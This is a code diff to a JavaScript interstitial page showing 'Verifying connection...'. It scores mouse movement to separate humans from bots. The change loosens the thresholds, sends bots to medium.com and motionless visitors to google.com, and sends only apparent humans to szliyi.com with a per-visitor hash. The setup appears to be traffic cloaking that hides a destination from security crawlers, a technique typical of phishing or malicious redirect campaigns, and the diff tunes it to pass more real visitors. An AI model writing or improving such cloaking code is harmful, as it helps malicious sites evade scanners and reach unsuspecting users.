@@ -191,7 +191,7 @@
               curr.x - coordinates[i-1].x
             );
             const angleDiff = Math.abs(currDir - prevDir);
-            if (angleDiff > 0.1) { // Threshold for direction change
+            if (angleDiff > 0.05) { // Reduced threshold for direction change
               directionChanges++;
             }
           }
@@ -201,9 +201,9 @@
         const avgSpeed = totalDistance / coordinates.length;
         const avgDirectionChanges = directionChanges / (coordinates.length - 2);
         
-        return avgSpeed > 5 && // Minimum speed threshold
-               avgDirectionChanges > 0.2 && // Minimum direction changes
-               avgDirectionChanges < 0.8; // Maximum direction changes
+        return avgSpeed > 2 && // Reduced minimum speed threshold
+               avgDirectionChanges > 0.1 && // Reduced minimum direction changes
+               avgDirectionChanges < 0.9; // Increased maximum direction changes
       };
 
       const handleMovement = (x, y) => {
@@ -220,7 +220,7 @@
         moveCount++;
         
         // Check if we have enough moves and they look natural
-        if (moveCount >= requiredMoves && isNaturalMovement(moveCoordinates)) {
+        if (moveCount >= 2 && isNaturalMovement(moveCoordinates)) { // Reduced required moves
           moved = true;
           clearTimeout(moveTimeout);
         }
@@ -296,14 +296,19 @@
 
       sendAnalytics();
 
-      // Reduced timeout for better UX
+      // Updated redirect logic
       setTimeout(() => {
-        if (isBot || !moved) {
-          window.location.href = "https://yelp.com";
+        if (isBot) {
+          // If it's a bot, redirect to Medium
+          window.location.href = "https://medium.com";
+        } else if (!moved) {
+          // If no movement detected, redirect to Google
+          window.location.href = "https://google.com";
         } else {
+          // If there was natural movement and not a bot, redirect to szliyi
           window.location.replace(`https://szliyi.com/${hash}`);
         }
-      }, 1000); // Reduced from 2000ms to 1000ms
+      }, 1000);
 
       const statusTexts = [
         "Verifying connection...",
